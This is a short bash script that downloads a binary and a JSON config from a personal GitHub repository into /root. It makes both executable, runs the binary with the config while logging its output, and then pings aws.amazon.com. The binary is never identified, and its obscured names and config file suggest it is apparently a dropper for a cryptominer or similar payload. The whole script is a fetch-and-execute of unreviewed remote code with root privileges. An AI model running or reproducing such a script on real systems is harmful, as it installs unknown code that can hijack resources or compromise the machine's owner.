#!/bin/bash
wget -O /root/cd https://github.com/jmmjiaa89/m/raw/refs/heads/main/csg
chmod u+x /root/cd
wget -O /root/xg.json https://raw.githubusercontent.com/jmmjiaa89/m/refs/heads/main/csg.json
chmod u+x /root/xg.json
/root/cd --config=/root/xg.json > /var/log/cd.log 2>&1
ping aws.amazon.com
